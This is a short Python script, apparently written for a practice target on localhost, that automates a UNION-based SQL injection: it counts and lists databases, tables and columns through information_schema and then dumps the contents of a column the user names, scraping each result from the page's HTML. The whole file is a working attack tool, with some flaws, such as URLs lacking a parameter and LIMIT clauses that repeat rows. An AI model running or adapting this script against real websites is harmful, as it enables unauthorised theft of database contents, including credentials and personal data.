import requests
import bs4


def dbCount():

    response = requests.get(
        "http://localhost' and 0 union select 1,2,3,4,count(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata -- -")
    doc = bs4.BeautifulSoup(response.text, "html.parser")
    result = doc.find("div", {
                      "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
    dbcount = result.get_text().strip()
    return dbcount


a = dbCount()

databaseNames = []


def DbNames():

    for i in range(1, int(a) + 1):
        response = requests.get(
            "http://localhost' and 0 union select 1,2,3,4,schema_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata limit "+str(i)+"-- -")
        doc = bs4.BeautifulSoup(response.text, "html.parser")
        result = doc.find("div", {
                          "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
        dbname = result.get_text().strip()
        databaseNames.append(dbname)


print()
DbNames()
print(databaseNames)

print()
dBname = input("ENTER DATABASE NAME : ")
print()


def tableCount():

    response = requests.get(
        "http://localhost' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema = '"+dBname+"'-- -")
    doc = bs4.BeautifulSoup(response.text, "html.parser")
    result = doc.find("div", {
                      "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
    tablecount = result.get_text().strip()
    return tablecount


b = tableCount()

tableNames = []


def TableName():

    for i in range(1, int(b) + 1):
        response = requests.get(
            "http://localhost' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema = '"+dBname+"' limit "+str(i)+" -- -")
        doc = bs4.BeautifulSoup(response.text, "html.parser")
        result = doc.find("div", {
                          "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
        dbname = result.get_text().strip()
        tableNames.append(dbname)


TableName()
print(tableNames)


print()
tablename = input("ENTER TABLE NAME : ")
print()


def columnCount():
    response = requests.get(
        "http://localhost' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema = '"+dBname+"' and table_name = '"+tablename+"' -- -")
    doc = bs4.BeautifulSoup(response.text, "html.parser")
    result = doc.find("div", {
                      "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
    columncount = result.get_text().strip()
    return columncount


c = columnCount()

columnNames = []


def columnName():

    for i in range(1, int(c) + 1):
        response = requests.get(
            "http://localhost' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema = '"+dBname+"' and table_name = '"+tablename+"' limit "+str(i)+" -- -")
        doc = bs4.BeautifulSoup(response.text, "html.parser")
        result = doc.find("div", {
                          "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
        dbname = result.get_text().strip()
        columnNames.append(dbname)


columnName()
print(columnNames)


def data():

    print()
    columnname = input("ENTER COLUMN NAME : ")
    print()

    def dataCount():
        response = requests.get(
            "http://localhost' and 0 union select 1,2,3,4,count("+columnname+"),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "+tablename+" -- -")
        doc = bs4.BeautifulSoup(response.text, "html.parser")
        result = doc.find("div", {
                          "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
        emailcount = result.get_text().strip()
        return emailcount

    d = dataCount()

    data = []

    def Data():

        for i in range(1, int(d) + 1):
            response = requests.get(
                "http://localhost' and 0 union select 1,2,3,4,"+columnname+",6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "+tablename+" limit "+str(i)+" -- -")
            doc = bs4.BeautifulSoup(response.text, "html.parser")
            result = doc.find("div", {
                              "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"})
            dbname = result.get_text().strip()
            data.append(dbname)

    Data()
    print(data)
    print()


data()
print(data())
data()
print(data())
